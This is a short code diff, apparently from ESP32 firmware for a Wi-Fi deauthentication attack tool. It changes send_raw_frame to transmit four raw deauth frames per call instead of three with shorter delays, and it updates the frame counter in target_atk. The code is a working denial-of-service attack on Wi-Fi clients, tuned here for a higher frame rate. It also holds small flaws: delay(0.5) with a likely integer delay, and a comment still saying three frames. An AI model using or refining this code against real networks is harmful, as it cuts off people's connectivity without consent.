@@ -41,11 +41,13 @@ wifi_ap_record_t ap_record;
 void send_raw_frame(const uint8_t *frame_buffer, int size)
 {
   esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
+    delay(0.5);
   esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
-  esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    delay(1);
+    delay(0.5);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    delay(0.5);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    delay(0.5);
 }
 
 /***************************************************************************************
@@ -294,7 +296,7 @@ void target_atk(String tssid, String mac, uint8_t channel)
     }
     // Send frame
     send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-    count += 3; // the function above sends 3 frames each time
+    count += 4; // the function above sends 3 frames each time
     // atualize counter
     if (millis() - tmp > 2000)
     {
